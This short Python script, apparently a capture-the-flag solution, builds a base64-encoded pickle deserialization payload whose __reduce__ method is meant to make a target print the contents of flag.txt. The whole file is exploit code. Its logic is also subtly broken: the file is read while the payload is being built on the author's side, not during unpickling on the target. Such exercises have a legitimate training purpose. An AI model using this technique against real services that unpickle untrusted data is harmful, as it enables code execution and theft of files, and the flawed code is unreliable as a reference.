import base64
import pickle

class Pickleicious:
    def __reduce__(self):
        with open('flag.txt', 'r') as flag_file:
            flag_content = flag_file.read()
        return (print, (flag_content,))

payload = base64.b64encode(pickle.dumps(Pickleicious())).decode('utf-8')
print(payload)